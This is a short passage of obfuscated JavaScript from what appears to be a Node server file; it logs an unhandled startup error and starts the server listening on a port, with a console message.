_0x48b43e=_0x11d2bd;console[_0x48b43e(0xc8)]('Unhandled\x20error\x20in\x20startserver:',_0xd8d23c);}),app[_0x11d2bd(0x113)](PORT,()=>console[_0x11d2bd(0x126)](_0x11d2bd(0xd1)+PORT+'!'));
